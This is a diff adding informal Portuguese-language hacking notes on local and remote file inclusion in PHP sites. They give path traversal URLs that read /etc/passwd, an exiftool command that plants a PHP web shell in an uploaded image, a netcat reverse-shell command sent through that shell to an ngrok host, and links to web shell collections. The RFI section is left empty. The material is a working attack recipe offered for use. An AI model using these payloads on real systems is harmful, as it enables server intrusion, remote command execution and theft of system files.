@@ -1,1 +1,33 @@
-asdasds
+
+- > LFI
+ exemplo: 
+  www.xxx.com.br/index.php?page = nome-de-arquivo.php 
+  O argumento "page" está recebendo um arquivo.php. Acontece que você consegue incluir comandos dentro do argumento e ele ser executado. 
+    www.xxx.com.br/index.php?page = ../../../../../../../../etc/passwd
+    www.xxx.com.br/index.php?page = ../../../../../../../../root/phpinfo
+  observação: Nos dois exemplos supracitados, você executa comandos, inclui comandos no argumento, que já existe no servidor e ele é executado.
+ exemplo 2: 
+  poderiamos subir um arquivo, por exemplo, foto.jpg malicioso usando o exiftool atráves de um formulário.
+  exemplos: 
+    exiftool -comment="<?php echo shell_exec(\$_GET[\"cmd\"]); ?>" imagem.jpeg, subiriamos arquivo que possui um código php para o servidor. 
+    agora que o servidor possui este arquivo, utilizaremos o mesmo para passar comandos (LFI).
+    
+    -inspecionar elemento 
+    -procurar pela foto que subimos para o servidor 
+    -clicar no diretorio da foto 
+    -imagem.jpeg?cmd = nc -e /bin/bash ip ngrok port 
+  
+  
+    
+    
+    
+    
+    
+ - > RFI 
+ exemplo: 
+  www.xxx.com.br/index.php?page = nome-de-arquivo.php 
+  
+  
+sites que possuem php shell:  
+  - > https://r57.gen.tr/
+  - > https://github.com/tennc/webshell 
